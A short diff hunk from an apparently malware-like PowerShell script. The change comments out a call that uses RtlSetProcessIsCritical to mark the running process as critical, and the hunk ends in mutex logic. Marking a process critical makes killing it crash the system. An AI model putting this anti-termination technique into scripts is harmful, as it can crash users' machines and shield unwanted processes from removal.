@@ -23,7 +23,7 @@ public class CS {
 }
 "@
 Add-Type -TypeDefinition $signature
-[CS]::RtlSetProcessIsCritical(1, 0, 0) | Out-Null
+# [CS]::RtlSetProcessIsCritical(1, 0, 0) | Out-Null
 
 if([string]::IsNullOrEmpty($basePath)){
     if($mutex.WaitOne(5000)){
